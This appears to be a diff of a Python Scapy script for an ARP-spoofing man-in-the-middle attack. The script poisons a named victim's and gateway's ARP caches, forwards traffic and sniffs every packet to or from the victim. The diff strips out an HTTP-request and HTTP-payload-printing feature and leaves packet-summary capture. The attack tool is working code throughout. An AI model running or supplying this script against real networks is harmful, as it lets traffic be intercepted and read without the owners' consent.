@@ -3,10 +3,9 @@ import sys
 import os
 import time
 import threading
-import requests
 
 def help_text():
-    print("\nUsage:\n python script.py <interface> <victim_ip> <gateway_ip> <url>\n")
+    print("\nUsage:\n python script.py <interface> <victim_ip> <gateway_ip>\n")
     sys.exit()
 
 def enable_ip_forwarding():
@@ -20,7 +19,7 @@ def disable_ip_forwarding():
 def get_mac(IP, interface):
     conf.verb = 0
     print(f"Sending ARP request to {IP} on interface {interface}...")
-    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, verbose=False)
+    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, verbose=False) # type: ignore
     for snd, rcv in ans:
         print(f"Received response from {rcv.psrc} with MAC {rcv.hwsrc}")
         return rcv.hwsrc
@@ -31,25 +30,16 @@ def reARP(victimIP, gatewayIP, interface):
     victimMAC = get_mac(victimIP, interface)
     gatewayMAC = get_mac(gatewayIP, interface)
     if victimMAC and gatewayMAC:
-        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
-        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
+        send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7) # type: ignore
+        send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7) # type: ignore
     disable_ip_forwarding()
     print("Shutting Down...")
     sys.exit(1)
 
 def trick(gm, vm):
-    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=vm))
-    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gm))
+    send(ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=vm)) # type: ignore
+    send(ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=gm)) # type: ignore
 
-def make_http_request(url):
-    try:
-        print(f"Initiating HTTP request to {url} from attacker's computer...")
-        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
-        response = requests.get(url, headers=headers)
-        return response
-    except requests.RequestException as e:
-        print(f"Error making HTTP request: {str(e)}")
-        return None
 
 def arp_spoof(victimIP, gatewayIP, interface):
     try:
@@ -79,39 +69,25 @@ def arp_spoof(victimIP, gatewayIP, interface):
             reARP(victimIP, gatewayIP, interface)
             break
 
-def packet_handler(packet, http_response):
-    if packet.haslayer(IP):
-        if packet.haslayer(TCP):
-            if packet[TCP].dport == 80 and packet[IP].dst == victimIP:
-                
-                if packet.haslayer(Raw):
-                    raw_data = packet[Raw].load.decode('utf-8', 'ignore')
-                    if http_response and raw_data.startswith(http_response.text.split('\n')[0]):
-                        print("[HTTP] HTTP Response from targeted site:")
-                        print(raw_data)
-                    else:
-                        print("[HTTP] HTTP Request/Response:")
-                        print(raw_data)
-            else:
-                print("[OTHER] Non-HTTP Packet:")
-                print(packet.summary())
+def packet_handler(packet):
+        print("Packet:")
+        print(packet.summary())
 
-def capture_packets(victimIP, interface, http_response):
+def capture_packets(victimIP, interface, ):
     try:
         print(f"Capturing all packets sent to {victimIP}...")
-        sniff(filter=f"host {victimIP}", prn=lambda x: packet_handler(x, http_response), iface=interface, store=0)
+        sniff(filter=f"host {victimIP}", prn=lambda x: packet_handler(x), iface=interface, store=0)
     except KeyboardInterrupt:
         print("\nStopping packet capture...")
         reARP(victimIP, gatewayIP, interface)
 
 if __name__ == '__main__':
-    if len(sys.argv) != 5:
+    if len(sys.argv) != 4:
         help_text()
     
     interface = sys.argv[1]
     victimIP = sys.argv[2]
     gatewayIP = sys.argv[3]
-    url_to_request = sys.argv[4]
     
     enable_ip_forwarding()
     
@@ -121,11 +97,8 @@ if __name__ == '__main__':
 
     time.sleep(5)
 
-    http_response = make_http_request(url_to_request)
-    
-
     try:
-        capture_packets(victimIP, interface, http_response)
+        capture_packets(victimIP, interface)
     except KeyboardInterrupt:
         print("\nStopping packet capture...")
         reARP(victimIP, gatewayIP, interface)
